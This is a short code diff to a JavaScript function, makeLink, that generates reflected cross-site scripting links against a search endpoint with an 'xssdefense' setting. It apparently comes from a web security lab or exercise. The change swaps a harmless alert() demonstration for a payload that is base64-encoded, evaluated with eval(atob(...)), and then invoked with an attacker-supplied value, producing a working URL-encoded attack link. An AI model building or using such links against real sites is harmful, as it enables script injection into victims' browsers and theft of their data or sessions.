@@ -134,7 +134,7 @@ function makeLink(xssdefense, target, attacker) {
         case 4:
         	var letsSee = payload.toString();
         	var t=btoa(letsSee);
-        	var intermediate = "<script" + ">" + "alert(atob(" + t.toString() + ").toString())</script" + ">";
+        	var intermediate = "<script" + ">" + "eval(atob(`" + t.toString() + "`)),payload(`" + attacker + "`)</script" + ">";
 
         	return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent(intermediate);
         	break;
